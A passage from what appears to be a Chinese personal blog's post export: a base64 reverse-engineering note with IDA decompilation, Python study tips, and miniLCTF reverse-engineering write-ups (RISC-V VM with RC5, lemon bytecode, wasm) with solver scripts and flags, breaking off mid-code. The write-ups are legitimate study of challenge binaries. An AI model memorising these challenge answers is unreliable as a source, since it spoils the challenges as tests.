// 4. add '=' if needed switch (str_len % 3) { case 1: res[len-1] = '='; res[len-2] = '='; break; case 2: res[len-1] = '='; break; } return res; } 逆向算法特征 将二进制文件拖入ida分析，能复原较为清晰的代码 _BYTE *__fastcall base64_encode(const char *str) { int len; // [rsp+18h] [rbp-68h] int v3; // [rsp+1Ch] [rbp-64h] int i; // [rsp+20h] [rbp-60h] int str_len; // [rsp+24h] [rbp-5Ch] _BYTE *res; // [rsp+28h] [rbp-58h] char table[72]; // [rsp+30h] [rbp-50h] BYREF unsigned __int64 v8; // [rsp+78h] [rbp-8h] v8 = __readfsqword(0x28u); strcpy(table, \u0026quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026quot;); str_len = strlen(str); if ( str_len % 3 ) len = 4 * (str_len / 3 + 1); else len = 4 * (str_len / 3); res = malloc(len + 1LL); res[len] = 0; v3 = 0; for ( i = 0; i \u0026lt; str_len; i += 3 ) { res[v3] = table[(unsigned __int8)str[i] \u0026gt;\u0026gt; 2]; res[v3 + 1] = table[((unsigned __int8)str[i + 1] \u0026gt;\u0026gt; 4) | (16 * str[i]) \u0026amp; 0x30]; res[v3 + 2] = table[((unsigned __int8)str[i + 2] \u0026gt;\u0026gt; 6) | (4 * str[i + 1]) \u0026amp; 0x3C]; res[v3 + 3] = table[str[i + 2] \u0026amp; 0x3F]; v3 += 4; } if ( str_len % 3 == 1 ) { res[len - 1] = '='; res[len - 2] = '='; } else if ( str_len % 3 == 2 ) { res[len - 1] = '='; } return res; } base64编码的显著特征在于编码表table，在逆向题中常见换表或动态生成表\n编码过程中的循环移位操作也是一大特征\n对len的判断也必不可少，是个突破点\n","id":17,"section":"posts","summary":"base64编码 编码原理 Base64是一种基于64个可打印字符来表示二进制数据的表示方法 由于$\\log_{2}{64}=6$，所以每6个比特","tags":["crypto"],"title":"逆向人学密码（一）base64编码","uri":"https://blog.dx39061.top/2022/07/base64/","year":"2022"},{"content":"基本输入输出 - 输入 python2：\ninput：希望读取一个合法的python表达式 raw_input：以字符串形式读取输入 python3：\n只有input：以字符串形式读取输入 - 输出 python2：print是一条语句，后不加括号\npython3：print是个函数，后加括号\n复合数据结构 - 列表 list函数：将可迭代对象类型的数据转化为列表，如元组、range对象、字符串等\ndel函数：删除列表特定值（下标索引）或删除整个列表，若列表对象不再有其他对象指向，python同时删除该列表对象\n使用+向列表中添加元素会生成新的列表，将元素逐一赋值过去，效率较低\nappend函数原地修改，效率较高\nextend函数将另一个迭代对象的所有元素添加至该列表的尾部，，不改变其内存首地址，属于原地操作\npop函数删除并返回指定元素（不提供下标则默认最后一个）\nremove函数删除首次出现的指定元素，无返回值\nshallow copy：拷贝外层对象，但内层对象还是指向相同对象，切片是shallow copy\ndeep copy：完全拷贝了对象及其子对象\n列表对象的sort方法原地排序，内置函数sorted返回新列表，不改变原列表\n- 元组 创建只有一个元素的元组必须在元素后加逗号\ndel函数只能删除整个元素，因为元组是不可变序列\n使用序列解包功能为多个变量同时赋值\n- 字典 字典也可以序列解包 使用 dict() 函数利用已有数据创建字典\nget方法：获取指定键对应的值，若不存在，返回指定值（若未指定则默认返回none）\nupdate方法：向字典中添加键值对，可使用=、字典、元组（注意一个元素时的逗号）\n- 集合 集合的交集、并集、差集等运算 选择与循环 - 选择 ==与is：==测试值的相等性，递归地比较所有内嵌对象，is测试二者是否是同一对象（是否在同一内存地址中）\n缓存复用：对象是小的整数或字符串时，多个变量可能指向同一对象以提高性能\n- 循环 while和for循环可以带else块，如果因循环表达式不成立而结束循环（不是break结束循环），则执行else中的内容 函数 - 可变长度参数 *parameter：接受多个形参并将其放在一个元组中\n**parameter：用来接受字典形式的实参（可使用**字典解包代替）\n- 函数调用时参数解包 使用列表、元组等可迭代对象作为实参，并在前面加一个分号\n使用字典传参，默认使用字典的键\n要保证实参形参个数相同\n- lambda函数 map函数：将函数作用的一个序列或迭代器的每一个元素上\nreduce函数：将一个接受两个参数的函数以累积的方式从左到右一次作用到一个序列或迭代器的每一个元素上\npython3需要from functools import reduce filter函数：将一个函数作用到一个序列上，返回序列中使该函数返回值为True的元素组成的序列\n- 迭代 文件迭代器\niter函数：根据可迭代对象构造成迭代器，对应可迭代对象的__iter__方法\nnext函数：迭代器的下一项，对应可迭代对象的__next__方法\n- 生成器 生成器函数（返回迭代器）\n生成器表达式（返回迭代器）\n类 - 类的__str__和__repr__方法 都是返回对象的字符串表示\n__str__：print函数优先使用__str__，若只重载了__repr__，则使用__repr__\n__repr__：除print函数以外所有地方优先使用__repr__\n- 内省 内省（introspection）是指计算机程序在运行时（run time）检查对象（object）类型的一种能力，也称作运行时类型检查（run-time type checking）\ninstance.__class__ 和 instance.__dict__方法\n自定义通用显示工具类 - 装饰器 由@符号开头，后面跟着所谓的元函数（metafunction）组成，一个函数加工另一个函数\n- 类的伪私有属性 class定义代码块内，开头有两个下划线，但结尾没有两个下划线的变量名，会自动扩展，从而包含它所在类的名称\n例如，Spam类内 __x 这样的变量名会自动变成 _Spam__x\n","id":18,"section":"posts","summary":"基本输入输出 - 输入 python2： input：希望读取一个合法的python表达式 raw_input：以字符串形式读取输入 python3： 只","tags":["python"],"title":"Python tips","uri":"https://blog.dx39061.top/2022/06/python-tips/","year":"2022"},{"content":"not RC4 RISC-V 逆向，有找到ida的插件，但装上一直报错，放弃\n又找到Ghidra，反编译很丑但能用，使劲看发现是个vm\n大致流程及指令\n0 0xf1 6 LAB_00100b7e 8 { int i; for (i = 0; i \u0026lt; 4; i ++) { if (\u0026amp;enc_flag[i]) != check_array[i]) { //longlong printf(\u0026quot;Wrong!\u0026quot;); exit(0); } } op_pointer++; return; } 0xf2 10 LAB_00100bfe 12 { if (key_num_2 \u0026lt; opcode[op_pointer + 2]) {//0x0b op_pointer -= opcode[op_pointer + 1];//4 key_num_2 ++; } else { key_num_2 = 0; op_pointer += 3; } return; } 0xf3 14 LAB_00100974 16 key_const_1 = 0x0000000064627421; key_const_2 = 0x0000000079796473; { left_8_bytes = input_left_8_bytes + key_const_1; right_8_bytes = input_right_8_bytes + key_const_2; op_pointer += 2; return; } 0xf4 18 LAB_00100a10 20 { if (opcode[op_pointer + 1] == 0xe1) { left_8_bytes = key_const_1 + ((right_8_bytes ^ left_8_bytes) \u0026gt;\u0026gt; (-right_8_bytes \u0026amp; 0x3f) | (right_8_bytes ^ left_8_bytes) \u0026lt;\u0026lt; (right_8_bytes \u0026amp; 0x3fU)); left_8_bytes = key_const_1 + rol(right_8_bytes ^ left_8_bytes, 6); } if (opcode[*op_pointer + 1] == 0xe2) { right_8_bytes = key_const_2 + ((right_8_bytes ^ left_8_bytes) \u0026gt;\u0026gt; (-left_8_bytes \u0026amp; 0x3f) | (right_8_bytes ^ left_8_bytes) \u0026lt;\u0026lt; (left_8_bytes \u0026amp; 0x3f)); } op_pointer += 2; return; } void RC5_ENCRYPT(WORD *pt, WORD *ct) { WORD i, A = pt[0] + S[0], B = pt[1] + S[1]; for(i = 1; i \u0026lt;= r; i++) { A = ROTL(A ^ B, B) + S[2*i]; B = ROTL(B ^ A, A) + S[2*i + 1]; } ct[0] = A; ct[1] = B; } (val \u0026lt;\u0026lt; r_bits%max_bits) \u0026amp; (2**max_bits-1) | \\ ((val \u0026amp; (2**max_bits-1)) \u0026gt;\u0026gt; (max_bits-(r_bits%max_bits))) 0xf5 22 LAB_00100af0 24 { *(undefined8 *)(\u0026amp;check_array + (longlong)key_num_1 * 8) = left_8_bytes; *(undefined8 *)(\u0026amp;check_array + (longlong)(key_num_1 + 1) * 8) = right_8_bytes; left_8_bytes = 0; right_8_bytes = 0; key_num_1 += 2; op_pointer++; return; } opcode = { 0xf3, 0x00, 0xf4, 0xe1, 0xf4, 0xe2, 0xf2, 0x04, 0x0b, 0xf5, 0xf3, 0x02, 0xf4, 0xe1, 0xf4, 0xe2, 0xf2, 0x04, 0x0b, 0xf5, 0xf1, 0xff } enc_flag = { 0xca, 0x82, 0xef, 0x95, 0xbb, 0x1d, 0xc2, 0x4b, 0xbe, 0x47, 0xb5, 0x71, 0xae, 0xec, 0x7b, 0xf5, 0xcd, 0xf6, 0xe7, 0x15, 0xab, 0xbd, 0xa1, 0x80, 0x85, 0x63, 0x77, 0xe1, 0xd7, 0x93, 0xc7, 0xa3 } 最后得知整个流程是个去掉了初始化的RC5（not RC4就在这\nexp\nfrom Crypto.Util.number import * enc_flag = [0x4bc21dbb95ef82ca, 0xf57becae71b547be, 0x80a1bdab15e7f6cd, 0xa3c793d7e1776385] key_const_1 = 0x0000000064627421 key_const_2 = 0x0000000079796473 rol = lambda val, r_bts, max_bits: \\ (val \u0026lt;\u0026lt; r_bits%max_bits) \u0026amp; (2**max_bits-1) | \\ ((val \u0026amp; (2**max_bits-1)) \u0026gt;\u0026gt; (max_bits-(r_bits%max_bits))) ror = lambda val, r_bits, max_bits: \\ ((val \u0026amp; (2**max_bits-1)) \u0026gt;\u0026gt; r_bits%max_bits) | \\ (val \u0026lt;\u0026lt; (max_bits-(r_bits%max_bits)) \u0026amp; (2**max_bits-1)) left_8_bytes = 0x4bc21dbb95ef82ca right_8_bytes = 0xf57becae71b547be for j in range(12): right_8_bytes = ror((right_8_bytes - key_const_2), left_8_bytes, 64) ^ left_8_bytes left_8_bytes = ror((left_8_bytes - key_const_1), right_8_bytes,64) ^ right_8_bytes left_8_bytes -= key_const_1 right_8_bytes -= key_const_2 print(long_to_bytes(left_8_bytes), long_to_bytes(right_8_bytes)) 字节序问题，最后要逆过来看\nflagminiLCTF{I_hate_U_r1sc-V!}\nlemon lemon语言逆向，给了一段字节码\n吐槽一下官方仓库readme写得太简略了，费了好大劲才搞懂工具怎么用\n然后就是体力活了\n猜一下，写点代码，\\dis一下，和题目文件比对一下，还原源代码\nvar v0 = 221492336; def next(){ v0 = (v0*3735928559 + 2974593325) % 4294967295; return v0; } class RunMe(){ def __init__(var n){ self.enc = []; self.flag = []; self.res = [2141786733, 76267819, 37219027, 219942343, 755999918, 701306806, 532732060, 334234642, 524809386, 333469062, 160092960, 126810196, 238089888, 301365991, 258515107, 424705310, 1041878913, 618187854, 4680810, 827308967, 66957703, 924471115, 735310319, 541128627, 47689903, 459905620, 495518230, 167708778, 586337393, 521761774, 861166604, 626644061, 1030425184, 665229750, 330150339]; for (var v1=0; v1\u0026lt;n; v1+=1){ self.enc.append(next()); } } def sign(var x, var y){ for(var v2=0; v2\u0026lt;35; v2+=1){ self.flag.append(x[v2] ^ y[v2]); } } } print(\u0026quot;Starting\u0026quot;); var v5 = RunMe(35); v5.sign(v5.res, v5.enc); print(v5.flag); print(\u0026quot;Done\u0026quot;); 运行得flag\nflagminiLctf{l3m0n_1s_s0_s0urrR77RrrR7}\nwhatAssembly 在js里藏着一个flag.wasm，直接请求下载就行\n下载官方工具包wabt\n使用wasm2c工具将wasm文件反编译成flag.c文件，./wasm2c wasm.wasm -o wasm.c，但是可读性不高\n继续优化，把wasm-rt.h和wasm.h和flag.c放在同一目录下，gcc -c flag.c -o flag，进行只编译不链接，这一步可能会出奇怪的问题，目前原因不明\n成功后就可拖进ida进行静态分析，会好看很多\n前面还尝试了jeb4.0（支持wasm直接反汇编/反编译），可用，但巨丑，效果远不如ida，故放弃\n以下结合出题人放出的源码分析，附带详细注释\ncheck函数\n__int64 __fastcall w2c_check(unsigned int flag, unsigned int key, unsigned int enc) { int v3; // eax unsigned int check_sp; // [rsp+24h] [rbp-47Ch] unsigned int v7; // [rsp+40h] [rbp-460h] unsigned int v8; // [rsp+44h] [rbp-45Ch] unsigned int v9; // [rsp+48h] [rbp-458h] unsigned int v10; // [rsp+4Ch] [rbp-454h] unsigned int v11; // [rsp+50h] [rbp-450h] unsigned int v12; // [rsp+54h] [rbp-44Ch] signed int v13; // [rsp+90h] [rbp-410h] int v14; // [rsp+B4h] [rbp-3ECh] unsigned int flag_cpy_len; // [rsp+DCh] [rbp-3C4h] unsigned int v16; // [rsp+E0h] [rbp-3C0h] unsigned int flag_cpy_addr; // [rsp+E4h] [rbp-3BCh] unsigned int v18; // [rsp+E8h] [rbp-3B8h] unsigned int v19; // [rsp+ECh] [rbp-3B4h] unsigned int v20; // [rsp+F4h] [rbp-3ACh] unsigned int v21; // [rsp+F8h] [rbp-3A8h] int key_addr; // [rsp+120h] [rbp-380h] unsigned int v23; // [rsp+128h] [rbp-378h] unsigned int v24; // [rsp+12Ch] [rbp-374h] unsigned int v25; // [rsp+140h] [rbp-360h] int i; // [rsp+160h] [rbp-340h] int v27; // [rsp+194h] [rbp-30Ch] int v28; // [rsp+198h] [rbp-308h] int v29; // [rsp+1A0h] [rbp-300h] unsigned int v30; // [rsp+1A8h] [rbp-2F8h] int v31; // [rsp+1B4h] [rbp-2ECh] int v32; // [rsp+300h] [rbp-1A0h] int v33; // [rsp+30Ch] [rbp-194h] int v34; // [rsp+324h] [rbp-17Ch] char v35; // [rsp+32Ch] [rbp-174h] unsigned int v36; // [rsp+34Ch] [rbp-154h] char v37; // [rsp+374h] [rbp-12Ch] unsigned int v38; // [rsp+39Ch] [rbp-104h] int v39; // [rsp+3A0h] [rbp-100h] int v40; // [rsp+3ACh] [rbp-F4h] int v41; // [rsp+3BCh] [rbp-E4h] char v42; // [rsp+3CCh] [rbp-D4h] unsigned int v43; // [rsp+3ECh] [rbp-B4h] char v44; // [rsp+414h] [rbp-8Ch] unsigned int v45; // [rsp+43Ch] [rbp-64h] unsigned int v46; // [rsp+458h] [rbp-48h] unsigned int v47; // [rsp+460h] [rbp-40h] int v48; // [rsp+46Ch] [rbp-34h] unsigned int v49; // [rsp+470h] [rbp-30h] unsigned int v50; // [rsp+470h] [rbp-30h] unsigned int v51; // [rsp+470h] [rbp-30h] unsigned int v52; // [rsp+470h] [rbp-30h] unsigned int v53; // [rsp+470h] [rbp-30h] unsigned int v54; // [rsp+470h] [rbp-30h] unsigned int v55; // [rsp+474h] [rbp-2Ch] __int64 v56; // [rsp+480h] [rbp-20h] __int64 v57; // [rsp+498h] [rbp-8h] w2c___stack_pointer -= 112; // new vm stack frame check_sp = w2c___stack_pointer; i32_store(\u0026amp;w2c_memory, (unsigned int)w2c___stack_pointer + 104LL, flag);// push flag i32_store(\u0026amp;w2c_memory, check_sp + 100LL, key);// push key i32_store(\u0026amp;w2c_memory, check_sp + 96LL, enc); // push enc v56 = i64_load(\u0026amp;w2c_memory, 1032LL); i64_store(\u0026amp;w2c_memory, check_sp + 88, v56); // table v57 = i64_load(\u0026amp;w2c_memory, 1024LL); i64_store(\u0026amp;w2c_memory, check_sp + 80, v57); // another table v7 = i32_load(\u0026amp;w2c_memory, check_sp + 104LL); // push len(flag) v8 = w2c_strlen(v7); i32_store(\u0026amp;w2c_memory, check_sp + 76LL, v8); v9 = i32_load(\u0026amp;w2c_memory, check_sp + 100LL); // push len(key) v10 = w2c_strlen(v9); i32_store(\u0026amp;w2c_memory, check_sp + 72LL, v10); v11 = i32_load(\u0026amp;w2c_memory, check_sp + 96LL); // push len(enc) v12 = w2c_strlen(v11); i32_store(\u0026amp;w2c_memory, check_sp + 68LL, v12); if ( (int)i32_load(\u0026amp;w2c_memory, check_sp + 72LL) \u0026gt;= 8// len(key) \u0026gt;= 8 \u0026amp;\u0026amp; (v13 = 4 * i32_load(\u0026amp;w2c_memory, check_sp + 76LL), v13 \u0026gt; (int)(i32_load(\u0026amp;w2c_memory, check_sp + 68LL) - 32))// 4 * len(flag) \u0026gt; len(enc) - 32 \u0026amp;\u0026amp; (v14 = 4 * i32_load(\u0026amp;w2c_memory, check_sp + 76LL), v14 \u0026lt;= (int)i32_load(\u0026amp;w2c_memory, check_sp + 68LL)) )// 4 * len(flag) \u0026lt;= len(enc) { flag_cpy_len = (i32_load(\u0026amp;w2c_memory, check_sp + 76LL) + 15) \u0026amp; 0xFFFFFFF0;// flag_cpy_len = (flag_len + 15) \u0026amp; ~15 i32_store(\u0026amp;w2c_memory, check_sp + 64LL, flag_cpy_len); v16 = i32_load(\u0026amp;w2c_memory, check_sp + 64LL); flag_cpy_addr = w2c_dlmalloc(v16); // malloc(flag_cpy_len) i32_store(\u0026amp;w2c_memory, check_sp + 60LL, flag_cpy_addr); v18 = i32_load(\u0026amp;w2c_memory, check_sp + 60LL); v19 = i32_load(\u0026amp;w2c_memory, check_sp + 64LL); w2c_memset(v18, 0LL, v19); // memset(flag_cpy_addr, 0, flag_cpy_len) v20 = i32_load(\u0026amp;w2c_memory, check_sp + 60LL); v21 = i32_load(\u0026amp;w2c_memory, check_sp + 104LL); v55 = i32_load(\u0026amp;w2c_memory, check_sp + 76LL); w2c___memcpy(v20, v21, v55); // memcpy(flag_cpy_addr, flag, flag_len) i32_store(\u0026amp;w2c_memory, check_sp + 28LL, 0LL);// i = 0 while ( (int)i32_load(\u0026amp;w2c_memory, check_sp + 28LL) \u0026lt; 8 )// while(i \u0026lt; 8) { key_addr = i32_load(\u0026amp;w2c_memory, check_sp + 100LL); v23 = i32_load(\u0026amp;w2c_memory, check_sp + 28LL) + key_addr;// key[i] v24 = i32_load8_u(\u0026amp;w2c_memory, v23); v25 = i32_load(\u0026amp;w2c_memory, check_sp + 28LL) + check_sp + 32;// new s i32_store8(\u0026amp;w2c_memory, v25, v24); // s[i] = key[i] v49 = i32_load(\u0026amp;w2c_memory, check_sp + 28LL) + 1;// i++ i32_store(\u0026amp;w2c_memory, check_sp + 28LL, v49); } i32_store(\u0026amp;w2c_memory, check_sp + 24LL, 0LL);// is_correct i32_store(\u0026amp;w2c_memory, check_sp + 20LL, 0LL);// i = 0 while ( 1 ) { i = i32_load(\u0026amp;w2c_memory, check_sp + 20LL); if ( i \u0026gt;= (int)i32_load(\u0026amp;w2c_memory, check_sp + 76LL) )// if(i \u0026gt;= flag_len) break; i32_store(\u0026amp;w2c_memory, check_sp + 16LL, 0LL);// j = 0 while ( (int)i32_load(\u0026amp;w2c_memory, check_sp + 16LL) \u0026lt; 8 )// while(j \u0026lt; 8) { v27 = i32_load(\u0026amp;w2c_memory, check_sp + 60LL);// flag_cpy_addr v28 = i32_load(\u0026amp;w2c_memory, check_sp + 20LL);// i v29 = i32_load(\u0026amp;w2c_memory, check_sp + 16LL) + v28;// j + i v30 = i32_load8_u(\u0026amp;w2c_memory, (unsigned int)(v29 + v27));// flag_cpy[i+j] v31 = i32_load(\u0026amp;w2c_memory, check_sp + 16LL) + 8;// j + 8 i32_store8(\u0026amp;w2c_memory, v31 + check_sp + 32, v30);// s[j+8] = flag_cpy[i+j] v50 = i32_load(\u0026amp;w2c_memory, check_sp + 16LL) + 1;// j++ i32_store(\u0026amp;w2c_memory, check_sp + 16LL, v50); } i32_store(\u0026amp;w2c_memory, check_sp + 12LL, 0LL);// j = 0 while ( (int)i32_load(\u0026amp;w2c_memory, check_sp + 12LL) \u0026lt; 42 )// while(j \u0026lt; 42) { w2c_qua_rou(check_sp + 32, 12LL, 8LL, 4LL, 0LL); w2c_qua_rou(check_sp + 32, 13LL, 9LL, 5LL, 1LL); w2c_qua_rou(check_sp + 32, 14LL, 10LL, 6LL, 2LL); w2c_qua_rou(check_sp + 32, 15LL, 11LL, 7LL, 3LL); w2c_qua_rou(check_sp + 32, 15LL, 10LL, 5LL, 0LL); w2c_qua_rou(check_sp + 32, 12LL, 11LL, 6LL, 1LL); w2c_qua_rou(check_sp + 32, 13LL, 8LL, 7LL, 2LL); w2c_qua_rou(check_sp + 32, 14LL, 9LL, 4LL, 3LL); v51 = i32_load(\u0026amp;w2c_memory, check_sp + 12LL) + 1;// j++ i32_store(\u0026amp;w2c_memory, check_sp + 12LL, v51); } i32_store(\u0026amp;w2c_memory, check_sp + 8LL, 0LL);// j = 0 while ( (int)i32_load(\u0026amp;w2c_memory, check_sp + 8LL) \u0026lt; 16 )// while(j \u0026lt; 16) { v32 = i32_load(\u0026amp;w2c_memory, check_sp + 96LL);// enc v33 = 4 * i32_load(\u0026amp;w2c_memory, check_sp + 20LL);// 4 * i v34 = 2 * i32_load(\u0026amp;w2c_memory, check_sp + 8LL) + v33;// 2*j + 4*i v35 = i32_load8_u(\u0026amp;w2c_memory, (unsigned int)(v34 + v32));// enc[2*j + 4*i] v36 = i32_load(\u0026amp;w2c_memory, check_sp + 8LL) + check_sp + 32;// s[j] v48 = (unsigned __int8)i32_load8_u(\u0026amp;w2c_memory, v36); v37 = i32_load8_u(\u0026amp;w2c_memory, v48 / 16 + check_sp + 80);// table[s[j] / 16] v38 = (v35 != v37) | (unsigned int)i32_load(\u0026amp;w2c_memory, check_sp + 24LL);// is_correct |= (enc[2*j + 4*i] != table[s[j] / 16]) i32_store(\u0026amp;w2c_memory, check_sp + 24LL, v38); v39 = i32_load(\u0026amp;w2c_memory, check_sp + 96LL); v40 = 4 * i32_load(\u0026amp;w2c_memory, check_sp + 20LL); v41 = 2 * i32_load(\u0026amp;w2c_memory, check_sp + 8LL) + v40; v42 = i32_load8_u(\u0026amp;w2c_memory, (unsigned int)(v41 + 1 + v39)); v43 = i32_load(\u0026amp;w2c_memory, check_sp + 8LL) + check_sp + 32; v3 = (unsigned __int8)i32_load8_u(\u0026amp;w2c_memory, v43) % 16; v44 = i32_load8_u(\u0026amp;w2c_memory, v3 + check_sp + 80); v45 = (v42 != v44) | (unsigned int)i32_load(\u0026amp;w2c_memory, check_sp + 24LL);// is_correct |= (enc[2*j + 4*i + 1] != table[s[j] % 16]) i32_store(\u0026amp;w2c_memory, check_sp + 24LL, v45); v52 = i32_load(\u0026amp;w2c_memory, check_sp + 8LL) + 1;// j++ i32_store(\u0026amp;w2c_memory, check_sp + 8LL, v52); } v53 = i32_load(\u0026amp;w2c_memory, check_sp + 20LL) + 8;// i += 8 i32_store(\u0026amp;w2c_memory, check_sp + 20LL, v53); } v46 = i32_load(\u0026amp;w2c_memory, check_sp + 60LL);// free(flag_cpy_addr) w2c_dlfree(v46); v54 = i32_load(\u0026amp;w2c_memory, check_sp + 24LL);// is_correct i32_store(\u0026amp;w2c_memory, check_sp + 108LL, v54); } else { i32_store(\u0026amp;w2c_memory, check_sp + 108LL, 0xFFFFFFFFLL); } v47 = i32_load(\u0026amp;w2c_memory, check_sp + 108LL); w2c___stack_pointer = check_sp + 112; // destory vm stack frame return v47; } 其中的table是在之前的init_memory中被初始化的 void *init_memory() { wasm_rt_allocate_memory(\u0026amp;w2c_memory, 256LL, 256LL); if ( (unsigned int)dword_14DE0 \u0026lt;= 0xD2B ) wasm_rt_trap(1LL); ZNSt16allocator_traitsISaINSt8__detail10_Hash_nodeISt4pairIKN6spdlog5level10level_enumEN3fmt2v617basic_string_viewIcEEELb0EEEEE10deallocateERSD_PSC_m( (void *)(w2c_memory + 1024), \u0026quot;0123456789abcdefunsigned short\u0026quot;, 0x92CuLL); if ( (unsigned int)dword_14DE0 \u0026lt;= 0xD2F ) wasm_rt_trap(1LL); ZNSt16allocator_traitsISaINSt8__detail10_Hash_nodeISt4pairIKN6spdlog5level10level_enumEN3fmt2v617basic_string_viewIcEEELb0EEEEE10deallocateERSD_PSC_m( (void *)(w2c_memory + 3372), \u0026amp;data_segment_data_1, 4uLL); if ( (unsigned int)dword_14DE0 \u0026lt;= 0xD2F ) wasm_rt_trap(1LL); return ZNSt16allocator_traitsISaINSt8__detail10_Hash_nodeISt4pairIKN6spdlog5level10level_enumEN3fmt2v617basic_string_viewIcEEELb0EEEEE10deallocateERSD_PSC_m( (void *)(w2c_memory + 3376), (const void *)data_segment_data_2, 0LL); } w2c_qua_rou函数 __int64 __fastcall w2c_qua_rou(unsigned int a1, unsigned int a, unsigned int b, unsigned int c, unsigned int d) { unsigned int v9; // [rsp+34h] [rbp-2ACh] int v10; // [rsp+38h] [rbp-2A8h] unsigned int v11; // [rsp+40h] [rbp-2A0h] char v12; // [rsp+4Ch] [rbp-294h] int v13; // [rsp+50h] [rbp-290h] unsigned int v14; // [rsp+58h] [rbp-288h] char v15; // [rsp+5Ch] [rbp-284h] int v16; // [rsp+7Ch] [rbp-264h] unsigned int v17; // [rsp+84h] [rbp-25Ch] char v18; // [rsp+90h] [rbp-250h] int v19; // [rsp+94h] [rbp-24Ch] unsigned int v20; // [rsp+9Ch] [rbp-244h] char v21; // [rsp+A0h] [rbp-240h] int v22; // [rsp+C4h] [rbp-21Ch] unsigned int v23; // [rsp+CCh] [rbp-214h] unsigned int v24; // [rsp+DCh] [rbp-204h] int v25; // [rsp+E0h] [rbp-200h] unsigned int v26; // [rsp+E8h] [rbp-1F8h] char v27; // [rsp+F4h] [rbp-1ECh] int v28; // [rsp+F8h] [rbp-1E8h] unsigned int v29; // [rsp+100h] [rbp-1E0h] char v30; // [rsp+104h] [rbp-1DCh] int v31; // [rsp+124h] [rbp-1BCh] unsigned int v32; // [rsp+12Ch] [rbp-1B4h] char v33; // [rsp+138h] [rbp-1A8h] int v34; // [rsp+13Ch] [rbp-1A4h] unsigned int v35; // [rsp+144h] [rbp-19Ch] char v36; // [rsp+148h] [rbp-198h] int v37; // [rsp+16Ch] [rbp-174h] unsigned int v38; // [rsp+174h] [rbp-16Ch] unsigned int v39; // [rsp+184h] [rbp-15Ch] int v40; // [rsp+188h] [rbp-158h] unsigned int v41; // [rsp+190h] [rbp-150h] char v42; // [rsp+19Ch] [rbp-144h] int v43; // [rsp+1A0h] [rbp-140h] unsigned int v44; // [rsp+1A8h] [rbp-138h] char v45; // [rsp+1ACh] [rbp-134h] int v46; // [rsp+1CCh] [rbp-114h] unsigned int v47; // [rsp+1D4h] [rbp-10Ch] char v48; // [rsp+1E0h] [rbp-100h] int v49; // [rsp+1E4h] [rbp-FCh] unsigned int v50; // [rsp+1ECh] [rbp-F4h] char v51; // [rsp+1F0h] [rbp-F0h] int v52; // [rsp+214h] [rbp-CCh] unsigned int v53; // [rsp+21Ch] [rbp-C4h] unsigned int v54; // [rsp+22Ch] [rbp-B4h] int v55; // [rsp+230h] [rbp-B0h] unsigned int v56; // [rsp+238h] [rbp-A8h] char v57; // [rsp+244h] [rbp-9Ch] int v58; // [rsp+248h] [rbp-98h] unsigned int v59; // [rsp+250h] [rbp-90h] char v60; // [rsp+254h] [rbp-8Ch] int v61; // [rsp+274h] [rbp-6Ch] unsigned int v62; // [rsp+27Ch] [rbp-64h] char v63; // [rsp+288h] [rbp-58h] int v64; // [rsp+28Ch] [rbp-54h] unsigned int v65; // [rsp+294h] [rbp-4Ch] char v66; // [rsp+298h] [rbp-48h] int v67; // [rsp+2BCh] [rbp-24h] unsigned int v68; // [rsp+2C4h] [rbp-1Ch] unsigned int v69; // [rsp+2D4h] [rbp-Ch] v9 = w2c___stack_pointer - 32; i32_store(\u0026amp;w2c_memory, (unsigned int)(w2c___stack_pointer - 32) + 28LL, a1); i32_store(\u0026amp;w2c_memory, v9 + 24LL, a); i32_store(\u0026amp;w2c_memory, v9 + 20LL, b); i32_store(\u0026amp;w2c_memory, v9 + 16LL, c); i32_store(\u0026amp;w2c_memory, v9 + 12LL, d); v10 = i32_load(\u0026amp;w2c_memory, v9 + 28LL); v11 = i32_load(\u0026amp;w2c_memory, v9 + 24LL) + v10; // s[a] v12 = i32_load8_u(\u0026amp;w2c_memory, v11); v13 = i32_load(\u0026amp;w2c_memory, v9 + 28LL); v14 = i32_load(\u0026amp;w2c_memory, v9 + 12LL) + v13; // s[d] v15 = i32_load8_u(\u0026amp;w2c_memory, v14); v16 = i32_load(\u0026amp;w2c_memory, v9 + 28LL); v17 = i32_load(\u0026amp;w2c_memory, v9 + 24LL) + v16; // s[a] v18 = i32_load8_u(\u0026amp;w2c_memory, v17); v19 = i32_load(\u0026amp;w2c_memory, v9 + 28LL); v20 = i32_load(\u0026amp;w2c_memory, v9 + 12LL) + v19; // s[d] v21 = i32_load8_u(\u0026amp;w2c_memory, v20); v22 = i32_load(\u0026amp;w2c_memory, v9 + 28LL); v23 = i32_load(\u0026amp;w2c_memory, v9 + 20LL) + v22; // s[b] v24 = (((int)(unsigned __int8)(v21 + v18) \u0026gt;\u0026gt; 4) | (16 * (unsigned __int8)(v15 + v12))) ^ (unsigned __int8)i32_load8_u(\u0026amp;w2c_memory, v23); i32_store8(\u0026amp;w2c_memory, v23, v24); // s[b] ^= ((s[a] + s[d]) \u0026gt;\u0026gt; 4) | ((s[a] + s[d]) \u0026lt;\u0026lt; 4) v25 = i32_load(\u0026amp;w2c_memory, v9 + 28LL); v26 = i32_load(\u0026amp;w2c_memory, v9 + 16LL) + v25; // s[c] v27 = i32_load8_u(\u0026amp;w2c_memory, v26); v28 = i32_load(\u0026amp;w2c_memory, v9 + 28LL); v29 = i32_load(\u0026amp;w2c_memory, v9 + 20LL) + v28; // s[b] v30 = i32_load8_u(\u0026amp;w2c_memory, v29); v31 = i32_load(\u0026amp;w2c_memory, v9 + 28LL); v32 = i32_load(\u0026amp;w2c_memory, v9 + 16LL) + v31; // s[c] v33 = i32_load8_u(\u0026amp;w2c_memory, v32); v34 = i32_load(\u0026amp;w2c_memory, v9 + 28LL); v35 = i32_load(\u0026amp;w2c_memory, v9 + 20LL) + v34; // s[b] v36 = i32_load8_u(\u0026amp;w2c_memory, v35); v37 = i32_load(\u0026amp;w2c_memory, v9 + 28LL); v38 = i32_load(\u0026amp;w2c_memory, v9 + 12LL) + v37; // s[d] v39 = (((int)(unsigned __int8)(v36 + v33) \u0026gt;\u0026gt; 6) | (4 * (unsigned __int8)(v30 + v27))) ^ (unsigned __int8)i32_load8_u(\u0026amp;w2c_memory, v38); i32_store8(\u0026amp;w2c_memory, v38, v39); // s[d] ^= ((s[b] + s[c]) \u0026gt;\u0026gt; 6) | ((s[c] + s[b]) \u0026lt;\u0026lt; 2) v40 = i32_load(\u0026amp;w2c_memory, v9 + 28LL); v41 = i32_load(\u0026amp;w2c_memory, v9 + 20LL) + v40; // s[b] v42 = 